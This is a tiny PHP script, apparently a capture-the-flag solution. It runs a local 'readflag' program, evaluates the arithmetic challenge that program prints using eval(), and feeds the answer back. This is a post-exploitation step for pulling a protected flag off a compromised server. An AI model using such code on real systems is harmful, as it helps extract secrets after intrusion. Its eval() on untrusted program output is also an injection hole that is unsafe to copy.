<?php
	$h = proc_open('./readflag',[['pipe','r'],['pipe','w'],['pipe','w']],$p);
	fread($p[1],1024);$s = fread($p[1],1024);$s=explode("\n",$s)[0];eval('$s='.$s.';');fwrite($p[0],$s);fread($p[1],1024);fread($p[1],1024);fread($p[1],1024);


?>